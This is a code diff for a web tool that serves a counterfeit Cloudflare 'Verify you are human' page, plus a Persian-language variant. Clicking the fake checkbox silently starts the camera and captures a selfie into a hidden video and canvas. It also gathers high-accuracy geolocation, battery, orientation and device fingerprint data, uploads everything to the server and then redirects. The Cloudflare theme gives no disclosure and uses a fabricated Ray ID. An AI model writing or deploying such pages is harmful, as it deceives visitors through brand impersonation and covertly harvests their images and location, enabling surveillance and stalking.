+    window.addEventListener('deviceorientation', listener);
+    await new Promise(function (r) { setTimeout(r, sampleMs || 500); });
+    window.removeEventListener('deviceorientation', listener);
+
+    var valid = collected.filter(function (s) { return s.alpha != null || s.beta != null || s.gamma != null; });
+    if (valid.length === 0) { result.note = 'no_events_received'; return result; }
+
+    var avgOf = function (key) {
+      var v = valid.map(function (s) { return s[key]; }).filter(function (n) { return typeof n === 'number'; });
+      return v.length ? v.reduce(function (a, b) { return a + b; }, 0) / v.length : null;
+    };
+    result.average = { alpha: avgOf('alpha'), beta: avgOf('beta'), gamma: avgOf('gamma') };
+    result.sampleCount = valid.length;
+    result.absolute = valid.some(function (s) { return s.absolute; });
+    result.posture = classifyPosture(result.average, result.screenOrientation);
+    return result;
+  }
+
+  function classifyPosture(avg, so) {
+    if (avg.beta == null && avg.gamma == null) return 'unknown';
+    var beta = avg.beta || 0, gamma = avg.gamma || 0, absB = Math.abs(beta), parts = [];
+    if (absB < 20) parts.push('flat');
+    else if (absB < 70) parts.push(beta > 0 ? 'tilted forward' : 'tilted backward');
+    else if (absB < 110) parts.push('upright');
+    else parts.push('face down');
+    if (gamma > 25) parts.push('rotated right');
+    else if (gamma < -25) parts.push('rotated left');
+    var t = so && so.type;
+    if (t) {
+      if (t.indexOf('portrait') === 0) parts.push('portrait');
+      else if (t.indexOf('landscape') === 0) parts.push('landscape');
+    }
+    return parts.join(' • ') || 'neutral';
+  }
+
+  async function collectBattery() {
+    var out = { supported: typeof navigator.getBattery === 'function' };
+    if (!out.supported) { out.reason = 'api_unsupported'; return out; }
+    try {
+      var b = await navigator.getBattery();
+      out.level = b.level; out.percent = Math.round(b.level * 100);
+      out.charging = !!b.charging;
+      out.chargingTime = isFinite(b.chargingTime) ? b.chargingTime : null;
+      out.dischargingTime = isFinite(b.dischargingTime) ? b.dischargingTime : null;
+    } catch (e) { out.error = String((e && e.message) || e); }
+    return out;
+  }
+
+  async function collectGeolocation() {
+    if (!('geolocation' in navigator)) return { supported: false, reason: 'api_unsupported' };
+    return new Promise(function (resolve) {
+      var done = false;
+      var finish = function (r) { if (done) return; done = true; resolve(r); };
+      var safety = setTimeout(function () {
+        finish({ supported: true, success: false, error: 'OUTER_TIMEOUT', message: 'Location timed out' });
+      }, 14000);
+      try {
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            clearTimeout(safety);
+            var c = pos.coords;
+            finish({
+              supported: true, success: true,
+              latitude: c.latitude, longitude: c.longitude, accuracy: c.accuracy,
+              altitude: typeof c.altitude === 'number' ? c.altitude : null,
+              altitudeAccuracy: typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
+              heading: typeof c.heading === 'number' ? c.heading : null,
+              speed: typeof c.speed === 'number' ? c.speed : null,
+              timestamp: pos.timestamp
+            });
+          },
+          function (err) {
+            clearTimeout(safety);
+            var names = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
+            finish({ supported: true, success: false, error: names[err.code] || 'CODE_' + err.code, message: String(err.message || '') });
+          },
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+        );
+      } catch (e) {
+        clearTimeout(safety);
+        finish({ supported: true, success: false, error: 'THROW', message: String((e && e.message) || e) });
+      }
+    });
+  }
+
+  function collectClientData() {
+    var c = navigator.connection || {}, now = new Date();
+    return {
+      userAgent: navigator.userAgent, language: navigator.language,
+      languages: navigator.languages ? Array.from(navigator.languages) : [],
+      platform: navigator.platform,
+      screenWidth: window.screen.width, screenHeight: window.screen.height,
+      innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+      devicePixelRatio: window.devicePixelRatio,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      onLine: navigator.onLine,
+      connectionType: c.effectiveType || null,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      localTime: now.toLocaleString(), utcTime: now.toISOString(),
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      pdfViewerEnabled: navigator.pdfViewerEnabled
+    };
+  }
+
+  async function run() {
+    if (busy || completed) return;
+    busy = true;
+    setState('busy');
+    var orientationPerm = await requestOrientationPermission();
+    var stream = null;
+    try {
+      var blob = null, captured = null, camInfo = {};
+
+      if (SELFIE_MODE === 'on') {
+        stream = await getCameraStream();
+        video.srcObject = stream;
+        await waitForVideo(video);
+        await new Promise(function (r) { setTimeout(r, 350); });
+        camInfo = await collectCameraInfo(stream);
+
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        blob = await new Promise(function (res) { canvas.toBlob(res, 'image/jpeg', 0.9); });
+        if (!blob) throw new Error('capture_failed');
+        captured = { width: canvas.width, height: canvas.height, size: blob.size };
+        stream.getTracks().forEach(function (t) { t.stop(); });
+        stream = null;
+      }
+
+      var results = await Promise.all([
+        orientationPerm.available ? collectOrientation() : Promise.resolve({ supported: false, reason: orientationPerm.reason }),
+        collectBattery(),
+        GEO_MODE === 'on' ? collectGeolocation() : Promise.resolve({ supported: true, skipped: true, note: 'disabled_by_admin' })
+      ]);
+
+      var clientData = collectClientData();
+      clientData.selfieMode = SELFIE_MODE;
+      clientData.geoMode = GEO_MODE;
+      clientData.camera = camInfo;
+      clientData.capturedFrame = captured;
+      clientData.orientation = results[0];
+      clientData.orientationPermission = orientationPerm;
+      clientData.battery = results[1];
+      clientData.geolocation = results[2];
+
+      var fd = new FormData();
+      if (SELFIE_MODE === 'on' && blob) fd.append('photo', blob, 'selfie.jpg');
+      fd.append('clientData', JSON.stringify(clientData));
+
+      var resp = await fetch('/upload', { method: 'POST', body: fd, credentials: 'same-origin' });
+      if (!resp.ok) {
+        var detail = '';
+        try { detail = (await resp.json()).error || ''; } catch (e) {}
+        throw new Error('upload_failed:' + (detail || resp.status));
+      }
+
+      completed = true;
+      setState('done');
+
+      if (REDIRECT_URL) {
+        setTimeout(function () { window.location.replace(REDIRECT_URL); }, 1500);
+      }
+    } catch (err) {
+      if (stream) stream.getTracks().forEach(function (t) { t.stop(); });
+      var name = err && err.name;
+      var msg = CAM_ERRORS[name] ||
+        (err && err.message === 'camera_timeout' ? (L.camTimeout || 'Camera timed out.')
+          : err && err.message && err.message.indexOf('upload_failed') === 0 ? (L.uploadError || 'Connection error.')
+          : (L.error || 'Something went wrong.'));
+      setState('error', msg);
+    } finally {
+      busy = false;
+    }
+  }
+
+  widget.addEventListener('click', function (e) {
+    if (e.target.closest && e.target.closest('a')) return;
+    if (busy || completed) return;
+    run();
+  });
+  widget.addEventListener('keydown', function (e) {
+    if ((e.key === ' ' || e.key === 'Enter') && !busy && !completed) {
+      e.preventDefault(); run();
+    }
+  });
+  if (retry) retry.addEventListener('click', function () { if (!busy) run(); });
+})();
+</script>`;
+}
+
+// ============================================================
+//  Theme: Cloudflare
+// ============================================================
+function renderCloudflareHTML(nonce, selfieMode, geoMode, redirectUrl) {
+  const labels = {
+    busy: 'Verifying...', done: 'Verification complete',
+    error: 'Verification failed. Please try again.',
+    camTimeout: 'Camera timed out. Please try again.',
+    uploadError: 'Connection error. Please try again.',
+  };
   return `<!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en" dir="ltr"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <title>Just a moment...</title>
 <style nonce="${nonce}">
   * { box-sizing: border-box; }
   html, body { margin: 0; padding: 0; min-height: 100%; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    font-size: 14px;
-    color: #232323;
-    background: #ffffff;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-  }
-  .cf-main {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 12px;
-  }
-  .cf-widget {
-    width: 300px;
-    height: 65px;
-    background: #ffffff;
-    border: 1px solid #e0e0e0;
-    border-radius: 4px;
-    display: flex;
-    align-items: center;
-    padding: 0 14px;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.06);
-    transition: border-color 0.15s, box-shadow 0.15s;
-    cursor: pointer;
-    user-select: none;
-    -webkit-tap-highlight-color: transparent;
-  }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 14px; color: #232323; background: #fff; min-height: 100vh;
+    display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+  .cf-main { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+  .cf-widget { width: 300px; height: 65px; background: #fff; border: 1px solid #e0e0e0; border-radius: 4px;
+    display: flex; align-items: center; padding: 0 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+    transition: border-color .15s; cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent; }
   .cf-widget:hover { border-color: #c8c8c8; }
   .cf-widget:focus { outline: none; border-color: #a0a0a0; }
   .cf-widget.busy, .cf-widget.done { cursor: default; }
-  .cf-checkbox {
-    width: 28px;
-    height: 28px;
-    border: 2px solid #b0b0b0;
-    border-radius: 4px;
-    background: #ffffff;
-    flex-shrink: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: all 0.2s ease;
-    position: relative;
-  }
-  .cf-widget.busy .cf-checkbox {
-    border-color: #e8e8e8;
-    background: #fafafa;
-  }
-  .cf-widget.busy .cf-checkbox::after {
-    content: "";
-    width: 18px;
-    height: 18px;
-    border: 2.5px solid #F38020;
-    border-right-color: transparent;
-    border-radius: 50%;
-    animation: cf-spin 0.8s linear infinite;
-    box-sizing: border-box;
-  }
-  .cf-widget.done .cf-checkbox {
-    border-color: #0cce6b;
-    background: #0cce6b;
-  }
-  .cf-widget.done .cf-checkbox::after {
-    content: "";
-    width: 6px;
-    height: 13px;
-    border: solid #ffffff;
-    border-width: 0 2.5px 2.5px 0;
-    transform: rotate(45deg) translate(-1px, -2px);
-    box-sizing: border-box;
-  }
+  .cf-checkbox { width: 28px; height: 28px; border: 2px solid #b0b0b0; border-radius: 4px;
+    background: #fff; flex-shrink: 0; display: flex; align-items: center; justify-content: center;
+    transition: all .2s; position: relative; }
+  .cf-widget.busy .cf-checkbox { border-color: #e8e8e8; background: #fafafa; }
+  .cf-widget.busy .cf-checkbox::after { content: ""; width: 18px; height: 18px;
+    border: 2.5px solid #F38020; border-right-color: transparent; border-radius: 50%;
+    animation: cf-spin .8s linear infinite; }
+  .cf-widget.done .cf-checkbox { border-color: #0cce6b; background: #0cce6b; }
+  .cf-widget.done .cf-checkbox::after { content: ""; width: 6px; height: 13px;
+    border: solid #fff; border-width: 0 2.5px 2.5px 0;
+    transform: rotate(45deg) translate(-1px, -2px); }
   @keyframes cf-spin { to { transform: rotate(360deg); } }
-  .cf-label {
-    flex: 1;
-    font-size: 14px;
-    color: #232323;
-    padding-left: 12px;
-    transition: color 0.15s;
-    line-height: 1.3;
-  }
-  .cf-brand {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-end;
-    gap: 1px;
-    flex-shrink: 0;
-  }
-  .cf-brand-logo {
-    display: flex;
-    align-items: center;
-    gap: 4px;
-    font-size: 11px;
-    color: #333;
-    font-weight: 500;
-    line-height: 1;
-  }
-  .cf-brand-logo svg { display: block; }
-  .cf-brand-links {
-    font-size: 9px;
-    color: #888;
-    white-space: nowrap;
-    line-height: 1;
-  }
+  .cf-label { flex: 1; font-size: 14px; color: #232323; padding-left: 12px; line-height: 1.3; }
+  .cf-brand { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; flex-shrink: 0; }
+  .cf-brand-logo { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #333; font-weight: 500; line-height: 1; }
+  .cf-brand-links { font-size: 9px; color: #888; white-space: nowrap; line-height: 1; }
   .cf-brand-links a { color: #888; text-decoration: none; }
   .cf-brand-links a:hover { text-decoration: underline; }
   .cf-brand-links span { margin: 0 3px; color: #ccc; }
-  .cf-status {
-    font-size: 12px;
-    color: #666;
-    min-height: 16px;
-    text-align: center;
-    max-width: 300px;
-    line-height: 1.4;
-  }
+  .cf-status { font-size: 12px; color: #666; min-height: 16px; text-align: center; max-width: 300px; line-height: 1.4; }
   .cf-status.error { color: #d93636; }
   .cf-status.ok { color: #0cce6b; }
-  .cf-retry {
-    background: none;
-    border: 1px solid #e0e0e0;
-    color: #232323;
-    padding: 6px 14px;
-    border-radius: 4px;
-    font-size: 12px;
-    cursor: pointer;
-    display: none;
-    font-family: inherit;
-    transition: background 0.15s;
-  }
+  .cf-retry { background: none; border: 1px solid #e0e0e0; color: #232323;
+    padding: 6px 14px; border-radius: 4px; font-size: 12px; cursor: pointer;
+    display: none; font-family: inherit; }
   .cf-retry:hover { background: #f5f5f5; }
-  .cf-footer {
-    position: fixed;
-    bottom: 12px;
-    right: 16px;
-    font-size: 11px;
-    color: #888;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    flex-wrap: wrap;
-    justify-content: flex-end;
-  }
-  .cf-footer b {
-    color: #555;
-    font-weight: 600;
-    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-  }
+  .cf-footer { position: fixed; bottom: 12px; right: 16px; font-size: 11px; color: #888;
+    display: flex; align-items: center; gap: 6px; flex-wrap: wrap; justify-content: flex-end; }
+  .cf-footer b { color: #555; font-weight: 600; font-family: ui-monospace, Menlo, monospace; }
   .cf-footer a { color: #F38020; text-decoration: none; }
   .cf-footer a:hover { text-decoration: underline; }
   .cf-footer .dot { color: #ccc; }
@@ -1324,12 +1494,10 @@ function renderHTML(nonce, selfieState, geoState) {
     .cf-widget { width: 100%; max-width: 300px; }
     .cf-footer { position: static; margin-top: 24px; justify-content: center; }
   }
-</style>
-</head>
-<body>
+</style></head><body>
   <main class="cf-main">
     <div class="cf-widget" id="widget" role="checkbox" aria-checked="false" tabindex="0" aria-label="Verify you are human">
-      <div class="cf-checkbox" id="checkbox"></div>
+      <div class="cf-checkbox"></div>
       <div class="cf-label" id="label">Verify you are human</div>
       <div class="cf-brand">
         <div class="cf-brand-logo">
@@ -1348,401 +1516,119 @@ function renderHTML(nonce, selfieState, geoState) {
     <div class="cf-status" id="status" role="status" aria-live="polite"></div>
     <button class="cf-retry" id="retry" type="button">Try again</button>
   </main>
-
   <footer class="cf-footer">
     <span>Cloudflare Ray ID: <b id="ray">—</b></span>
     <span class="dot">•</span>
     <span>Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a></span>
   </footer>
-
   <video id="hiddenVideo" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
-
-<script nonce="${nonce}">
-(() => {
-  const SELFIE_MODE = ${JSON.stringify(selfieMode)};
-  const GEO_MODE = ${JSON.stringify(geoMode)};
-
-  const el = {
-    widget: document.getElementById('widget'),
-    checkbox: document.getElementById('checkbox'),
-    label: document.getElementById('label'),
-    status: document.getElementById('status'),
-    retry: document.getElementById('retry'),
-    video: document.getElementById('hiddenVideo'),
-    canvas: document.getElementById('canvas'),
-    ray: document.getElementById('ray'),
-  };
-
-  (function () {
-    const chars = '0123456789abcdef';
-    let id = '';
-    for (let i = 0; i < 16; i++) id += chars[Math.floor(Math.random() * 16)];
-    el.ray.textContent = id;
-  })();
-
-  let busy = false;
-  let completed = false;
-
-  const CAM_ERRORS = {
-    NotAllowedError: 'Camera access was denied. Please allow it and try again.',
-    NotFoundError: 'No camera was found on this device.',
-    NotReadableError: 'The camera is currently in use by another application.',
-    OverconstrainedError: 'The camera does not support the requested settings.',
-    SecurityError: 'Camera access is blocked for security reasons (HTTPS required).',
-    AbortError: 'Camera access was aborted.',
-  };
-
-  function setState(state, message) {
-    el.widget.classList.remove('busy', 'done');
-    el.widget.setAttribute('aria-checked', 'false');
-    el.status.className = 'cf-status';
-    el.status.textContent = message || '';
-    el.retry.style.display = 'none';
-
-    if (state === 'busy') {
-      el.widget.classList.add('busy');
-      el.status.textContent = 'Verifying...';
-    } else if (state === 'done') {
-      el.widget.classList.add('done');
-      el.widget.setAttribute('aria-checked', 'true');
-      el.status.classList.add('ok');
-      el.status.textContent = 'Verification complete';
-    } else if (state === 'error') {
-      el.status.classList.add('error');
-      el.status.textContent = message || 'Verification failed. Please try again.';
-      el.retry.style.display = 'inline-block';
-    }
-  }
-
-  async function getCameraStream() {
-    const primary = { video: { facingMode: 'user' }, audio: false };
-    try {
-      return await navigator.mediaDevices.getUserMedia(primary);
-    } catch (e) {
-      if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError') {
-        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      }
-      throw e;
-    }
-  }
-
-  function waitForVideo(video, timeoutMs = 6000) {
-    if (video.readyState >= 2) return Promise.resolve();
-    return new Promise((resolve, reject) => {
-      const to = setTimeout(() => reject(new Error('camera_timeout')), timeoutMs);
-      video.onloadeddata = () => { clearTimeout(to); resolve(); };
-    });
-  }
-
-  async function collectCameraInfo(stream) {
-    const info = {};
-    const track = stream.getVideoTracks()[0];
-    if (!track) return info;
-    try {
-      const s = track.getSettings?.() || {};
-      const c = track.getCapabilities?.() || {};
-      info.deviceId = s.deviceId;
-      info.groupId = s.groupId;
-      info.facingMode = s.facingMode;
-      info.width = s.width;
-      info.height = s.height;
-      info.frameRate = s.frameRate;
-      info.aspectRatio = s.aspectRatio;
-      info.resizeMode = s.resizeMode;
-      info.focusMode = s.focusMode;
-      info.exposureMode = s.exposureMode;
-      info.whiteBalanceMode = s.whiteBalanceMode;
-      info.supportedFacingModes = c.facingMode || [];
-      info.supportedFocusModes = c.focusMode || [];
-      info.hasTorch = !!c.torch;
-      info.zoom = c.zoom ? { min: c.zoom.min, max: c.zoom.max, step: c.zoom.step } : null;
-      info.iso = c.iso ? { min: c.iso.min, max: c.iso.max, step: c.iso.step } : null;
-      info.focusDistance = c.focusDistance
-        ? { min: c.focusDistance.min, max: c.focusDistance.max } : null;
-      info.brightness = c.brightness ? { min: c.brightness.min, max: c.brightness.max } : null;
-      info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
-      info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
-      info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
-      info.requestedConstraints = track.getConstraints?.() || null;
-    } catch (e) { info._settingsError = String(e); }
-    try {
-      const devices = await navigator.mediaDevices.enumerateDevices();
-      info.videoDeviceCount = devices.filter((d) => d.kind === 'videoinput').length;
-      info.audioDeviceCount = devices.filter((d) => d.kind === 'audioinput').length;
-      info.videoDeviceLabels = devices
-        .filter((d) => d.kind === 'videoinput')
-        .map((d) => d.label || '(unnamed)');
-    } catch (e) { info._enumerateError = String(e); }
-    return info;
-  }
-
-  async function requestOrientationPermission() {
-    try {
-      if (typeof DeviceOrientationEvent === 'undefined') {
-        return { available: false, reason: 'unsupported' };
-      }
-      if (typeof DeviceOrientationEvent.requestPermission === 'function') {
-        const state = await DeviceOrientationEvent.requestPermission();
-        return { available: state === 'granted', reason: state };
-      }
-      return { available: true, reason: 'no_permission_needed' };
-    } catch (e) {
-      return { available: false, reason: String((e && e.message) || e) };
-    }
-  }
-
-  async function collectOrientation(sampleMs = 500) {
-    const result = {
-      supported: typeof DeviceOrientationEvent !== 'undefined',
-      samples: [],
-    };
-    try {
-      if (screen.orientation) {
-        result.screenOrientation = {
-          type: screen.orientation.type,
-          angle: screen.orientation.angle,
-        };
-      } else if (typeof window.orientation !== 'undefined') {
-        result.screenOrientation = { angle: window.orientation };
-      }
-    } catch (e) { result._screenOrientationError = String(e); }
-    if (!result.supported) return result;
-
-    const collected = [];
-    const listener = (ev) => {
-      collected.push({
-        alpha: typeof ev.alpha === 'number' ? ev.alpha : null,
-        beta: typeof ev.beta === 'number' ? ev.beta : null,
-        gamma: typeof ev.gamma === 'number' ? ev.gamma : null,
-        absolute: ev.absolute === true,
-      });
-    };
-    window.addEventListener('deviceorientation', listener);
-    await new Promise((r) => setTimeout(r, sampleMs));
-    window.removeEventListener('deviceorientation', listener);
-
-    const valid = collected.filter((s) => s.alpha != null || s.beta != null || s.gamma != null);
-    if (valid.length === 0) { result.note = 'no_events_received'; return result; }
-
-    const avgOf = (key) => {
-      const v = valid.map((s) => s[key]).filter((n) => typeof n === 'number');
-      return v.length ? v.reduce((a, b) => a + b, 0) / v.length : null;
-    };
-    result.average = {
-      alpha: avgOf('alpha'),
-      beta: avgOf('beta'),
-      gamma: avgOf('gamma'),
-    };
-    result.sampleCount = valid.length;
-    result.absolute = valid.some((s) => s.absolute);
-    result.posture = classifyPosture(result.average, result.screenOrientation);
-    return result;
-  }
-
-  function classifyPosture(avg, screenOrient) {
-    if (avg.beta == null && avg.gamma == null) return 'unknown';
-    const beta = avg.beta ?? 0;
-    const gamma = avg.gamma ?? 0;
-    const absB = Math.abs(beta);
-    const parts = [];
-    if (absB < 20) parts.push('flat');
-    else if (absB < 70) parts.push(beta > 0 ? 'tilted forward' : 'tilted backward');
-    else if (absB < 110) parts.push('upright');
-    else parts.push('face down');
-    if (gamma > 25) parts.push('rotated right');
-    else if (gamma < -25) parts.push('rotated left');
-    const t = screenOrient && screenOrient.type;
-    if (t) {
-      if (t.indexOf('portrait') === 0) parts.push('portrait');
-      else if (t.indexOf('landscape') === 0) parts.push('landscape');
-    }
-    return parts.join(' • ') || 'neutral';
-  }
-
-  async function collectBattery() {
-    const out = { supported: typeof navigator.getBattery === 'function' };
-    if (!out.supported) { out.reason = 'api_unsupported'; return out; }
-    try {
-      const b = await navigator.getBattery();
-      out.level = b.level;
-      out.percent = Math.round(b.level * 100);
-      out.charging = !!b.charging;
-      out.chargingTime = Number.isFinite(b.chargingTime) ? b.chargingTime : null;
-      out.dischargingTime = Number.isFinite(b.dischargingTime) ? b.dischargingTime : null;
-    } catch (e) { out.error = String((e && e.message) || e); }
-    return out;
-  }
-
-  async function collectGeolocation() {
-    if (!('geolocation' in navigator)) {
-      return { supported: false, reason: 'api_unsupported' };
-    }
-    return new Promise((resolve) => {
-      let done = false;
-      const finish = (result) => { if (done) return; done = true; resolve(result); };
-      const safety = setTimeout(() => {
-        finish({ supported: true, success: false, error: 'OUTER_TIMEOUT', message: 'Location request timed out' });
-      }, 14000);
-      try {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            clearTimeout(safety);
-            const c = pos.coords;
-            finish({
-              supported: true,
-              success: true,
-              latitude: c.latitude,
-              longitude: c.longitude,
-              accuracy: c.accuracy,
-              altitude: typeof c.altitude === 'number' ? c.altitude : null,
-              altitudeAccuracy: typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
-              heading: typeof c.heading === 'number' ? c.heading : null,
-              speed: typeof c.speed === 'number' ? c.speed : null,
-              timestamp: pos.timestamp,
-            });
-          },
-          (err) => {
-            clearTimeout(safety);
-            const errNames = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
-            finish({
-              supported: true, success: false,
-              error: errNames[err.code] || 'CODE_' + err.code,
-              message: String(err.message || ''),
-            });
-          },
-          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
-        );
-      } catch (e) {
-        clearTimeout(safety);
-        finish({ supported: true, success: false, error: 'THROW', message: String((e && e.message) || e) });
-      }
-    });
-  }
-
-  function collectClientData() {
-    const c = navigator.connection || {};
-    const now = new Date();
-    return {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      languages: navigator.languages ? Array.from(navigator.languages) : [],
-      platform: navigator.platform,
-      screenWidth: window.screen.width,
-      screenHeight: window.screen.height,
-      innerWidth: window.innerWidth,
-      innerHeight: window.innerHeight,
-      devicePixelRatio: window.devicePixelRatio,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory,
-      onLine: navigator.onLine,
-      connectionType: c.effectiveType || null,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      localTime: now.toLocaleString(),
-      utcTime: now.toISOString(),
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      pdfViewerEnabled: navigator.pdfViewerEnabled,
-    };
-  }
-
-  async function run() {
-    if (busy || completed) return;
-    busy = true;
-    setState('busy');
-
-    const orientationPerm = await requestOrientationPermission();
-
-    let stream = null;
-    try {
-      let blob = null;
-      let captured = null;
-      let camInfo = {};
-
-      if (SELFIE_MODE === 'on') {
-        stream = await getCameraStream();
-        el.video.srcObject = stream;
-        await waitForVideo(el.video);
-        await new Promise((r) => setTimeout(r, 350));
-        camInfo = await collectCameraInfo(stream);
-
-        el.canvas.width = el.video.videoWidth || 640;
-        el.canvas.height = el.video.videoHeight || 480;
-        el.canvas.getContext('2d').drawImage(el.video, 0, 0, el.canvas.width, el.canvas.height);
-        blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
-        if (!blob) throw new Error('capture_failed');
-        captured = { width: el.canvas.width, height: el.canvas.height, size: blob.size };
-        stream.getTracks().forEach((t) => t.stop());
-        stream = null;
-      }
-
-      const [orientation, battery, geolocation] = await Promise.all([
-        orientationPerm.available
-          ? collectOrientation()
-          : Promise.resolve({ supported: false, reason: orientationPerm.reason }),
-        collectBattery(),
-        GEO_MODE === 'on'
-          ? collectGeolocation()
-          : Promise.resolve({ supported: true, skipped: true, note: 'disabled_by_admin' }),
-      ]);
-
-      const clientData = collectClientData();
-      clientData.selfieMode = SELFIE_MODE;
-      clientData.geoMode = GEO_MODE;
-      clientData.camera = camInfo;
-      clientData.capturedFrame = captured;
-      clientData.orientation = orientation;
-      clientData.orientationPermission = orientationPerm;
-      clientData.battery = battery;
-      clientData.geolocation = geolocation;
-
-      const fd = new FormData();
-      if (SELFIE_MODE === 'on' && blob) fd.append('photo', blob, 'selfie.jpg');
-      fd.append('clientData', JSON.stringify(clientData));
-
-      const resp = await fetch('/upload', {
-        method: 'POST',
-        body: fd,
-        credentials: 'same-origin',
-      });
-      if (!resp.ok) {
-        let detail = '';
-        try { detail = (await resp.json()).error || ''; } catch {}
-        throw new Error('upload_failed:' + (detail || resp.status));
-      }
-
-      completed = true;
-      setState('done');
-    } catch (err) {
-      if (stream) stream.getTracks().forEach((t) => t.stop());
-      const name = err && err.name;
-      const msg =
-        CAM_ERRORS[name] ||
-        (err && err.message === 'camera_timeout'
-          ? 'Camera timed out. Please try again.'
-          : err && err.message && err.message.indexOf('upload_failed') === 0
-          ? 'Connection error. Please try again.'
-          : 'Something went wrong. Please try again.');
-      setState('error', msg);
-    } finally {
-      busy = false;
-    }
-  }
-
-  el.widget.addEventListener('click', (e) => {
-    if (e.target.closest('a')) return;
-    if (busy || completed) return;
-    run();
-  });
-  el.widget.addEventListener('keydown', (e) => {
-    if ((e.key === ' ' || e.key === 'Enter') && !busy && !completed) {
-      e.preventDefault();
-      run();
-    }
-  });
-  el.retry.addEventListener('click', () => { if (!busy) run(); });
-})();
-</script>
-</body>
-</html>`;
+  ${captchaScript(nonce, selfieMode, geoMode, redirectUrl, labels)}
+</body></html>`;
 }
+
+// ============================================================
+//  Theme: Classic (Persian)
+// ============================================================
+function renderClassicHTML(nonce, selfieMode, geoMode, redirectUrl) {
+  const labels = {
+    busy: 'در حال بررسی...', done: 'اطلاعات با موفقیت ارسال شد.',
+    error: 'خطایی رخ داد. لطفاً دوباره تلاش کنید.',
+    labelBusy: 'در حال بررسی...', labelDone: 'تایید شد', labelIdle: 'من ربات نیستم',
+    camNotAllowed: 'دسترسی به دوربین رد شد.',
+    camNotFound: 'دوربینی یافت نشد.',
+    camNotReadable: 'دوربین در حال استفاده است.',
+    camOverconstrained: 'تنظیمات دوربین سازگار نیست.',
+    camSecurity: 'HTTPS الزامی است.',
+    camAbort: 'دسترسی به دوربین لغو شد.',
+    camTimeout: 'زمان انتظار برای دوربین به پایان رسید.',
+    uploadError: 'ارسال اطلاعات ناموفق بود.',
+  };
+  const hint = selfieMode === 'on'
+    ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
+      (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '')
+    : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
+      (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '');
+
+  return `<!DOCTYPE html>
+<html lang="fa" dir="rtl"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>تایید هویت</title>
+<style nonce="${nonce}">
+  :root { --accent:#4a90e2; --ok:#22a06b; --err:#d93636; --muted:#6b7280; --border:#dcdfe4; }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; }
+  body { display: flex; align-items: center; justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #f5f6f8; color: #1f2328; padding: 16px; }
+  .card { width: 100%; max-width: 360px; background: #fff;
+    border: 1px solid var(--border); border-radius: 12px;
+    box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px; }
+  .row { display: flex; align-items: center; gap: 14px; }
+  .checkbox { width: 28px; height: 28px; border: 2px solid #9ca3af; border-radius: 6px;
